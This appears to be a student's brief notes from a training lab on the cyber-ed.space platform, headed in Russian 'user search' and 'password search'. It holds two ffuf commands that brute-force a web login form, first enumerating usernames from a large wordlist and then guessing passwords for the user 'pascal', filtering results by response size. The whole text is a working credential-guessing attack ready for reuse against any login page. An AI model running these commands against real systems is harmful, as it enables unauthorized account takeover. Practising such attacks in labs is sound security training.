
Поиск пользователя

ffuf -u "http://web.n2vzh01phoywmljp6fan.labs.cyber-ed.space" -X POST -d "name=FUZZ&password=qwe" -H "Content-Type: application/x-www-form-urlencoded" -w Downloads/seclists/Usernames/xato-net-10-million-usernames.txt -fs 2507  

Поиск пароля

ffuf -u "http://web.n2vzh01phoywmljp6fan.labs.cyber-ed.space" -X POST -d "name=pascal&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w Downloads/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -fs 2510